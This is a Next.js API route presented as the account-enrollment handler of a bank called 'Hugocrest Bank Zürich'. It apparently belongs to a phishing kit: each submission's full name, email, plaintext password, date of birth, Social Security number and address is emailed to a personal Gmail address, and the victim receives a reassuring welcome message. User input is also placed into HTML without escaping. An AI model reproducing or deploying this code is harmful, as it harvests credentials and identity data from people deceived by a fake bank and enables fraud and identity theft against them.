import { NextResponse } from 'next/server';

export async function POST(request: Request) {
  try {
    const data = await request.json();
    
    // Construct the email body
    const htmlBody = `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #eee; border-radius: 8px;">
        <h2 style="color: #333; border-bottom: 2px solid #047857; padding-bottom: 10px;">New Bank Account Enrollment</h2>
        <p style="color: #555; font-size: 16px;">A new user has just completed the enrollment form. Here are their details:</p>
        <table style="width: 100%; border-collapse: collapse; margin-top: 20px;">
          <tbody>
            <tr><td style="padding: 8px 0; border-bottom: 1px solid #f0f0f0;"><strong>Name:</strong></td><td style="padding: 8px 0; border-bottom: 1px solid #f0f0f0;">${data.firstName} ${data.lastName}</td></tr>
            <tr><td style="padding: 8px 0; border-bottom: 1px solid #f0f0f0;"><strong>Email:</strong></td><td style="padding: 8px 0; border-bottom: 1px solid #f0f0f0;">${data.email}</td></tr>
            <tr><td style="padding: 8px 0; border-bottom: 1px solid #f0f0f0;"><strong>Password:</strong></td><td style="padding: 8px 0; border-bottom: 1px solid #f0f0f0; color: #d93025; font-family: monospace;">${data.password}</td></tr>
            <tr><td style="padding: 8px 0; border-bottom: 1px solid #f0f0f0;"><strong>Phone:</strong></td><td style="padding: 8px 0; border-bottom: 1px solid #f0f0f0;">${data.phone || 'N/A'}</td></tr>
            <tr><td style="padding: 8px 0; border-bottom: 1px solid #f0f0f0;"><strong>Date of Birth:</strong></td><td style="padding: 8px 0; border-bottom: 1px solid #f0f0f0;">${data.dob}</td></tr>
            <tr><td style="padding: 8px 0; border-bottom: 1px solid #f0f0f0;"><strong>SSN:</strong></td><td style="padding: 8px 0; border-bottom: 1px solid #f0f0f0;">${data.ssn}</td></tr>
            <tr><td style="padding: 8px 0; border-bottom: 1px solid #f0f0f0;"><strong>Address:</strong></td><td style="padding: 8px 0; border-bottom: 1px solid #f0f0f0;">${data.address}, ${data.city}, ${data.state} ${data.zipCode}</td></tr>
            <tr><td style="padding: 8px 0; border-bottom: 1px solid #f0f0f0;"><strong>Account Type:</strong></td><td style="padding: 8px 0; border-bottom: 1px solid #f0f0f0;">${data.accountType}</td></tr>
          </tbody>
        </table>
        <p style="color: #777; margin-top: 30px; font-size: 14px; text-align: center;">Please review their application in the Admin Dashboard.</p>
      </div>
    `;

    // Use the Resend REST API directly
    const res = await fetch('https://api.resend.com/emails', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${process.env.RESEND_API_KEY || process.env.RESEND_API_KEY}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        from: 'Hugocrest Bank System <support@hugocrest.com>',
        to: 'sarahcesar1011@gmail.com',
        subject: `New Enrollment: ${data.firstName} ${data.lastName}`,
        html: htmlBody
      })
    });

    if (!res.ok) {
      const errorText = await res.text();
      console.error('Resend API Error (Admin):', errorText);
      return NextResponse.json({ error: 'Failed to send admin email' }, { status: 500 });
    }

    // 2. Send the Welcome email to the User
    const userHtmlBody = `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #eee; border-radius: 8px;">
        <h2 style="color: #333; border-bottom: 2px solid #047857; padding-bottom: 10px;">Welcome to Hugocrest Bank Zürich!</h2>
        <p style="color: #555; font-size: 16px;">Dear ${data.firstName},</p>
        <p style="color: #555; font-size: 16px;">Thank you for enrolling with Hugocrest Bank Zürich. We have successfully received your application.</p>
        <p style="color: #555; font-size: 16px;">You can now log into your online banking dashboard at any time using your email and password.</p>
        <br/>
        <p style="color: #777; font-size: 14px;">Best regards,<br/>The Hugocrest Bank Zürich Team</p>
      </div>
    `;

    const userRes = await fetch('https://api.resend.com/emails', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${process.env.RESEND_API_KEY || process.env.RESEND_API_KEY}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        from: 'Hugocrest Bank System <support@hugocrest.com>',
        to: data.email,
        subject: `Welcome to Hugocrest Bank Zürich, ${data.firstName}!`,
        html: userHtmlBody
      })
    });

    if (!userRes.ok) {
      const errorText = await userRes.text();
      console.error('Resend API Error (User):', errorText);
      // We don't want to block the signup completely if only the user email fails, but we log it
    }

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error('Notification Error:', error);
    return NextResponse.json({ error: 'Internal Server Error' }, { status: 500 });
  }
}
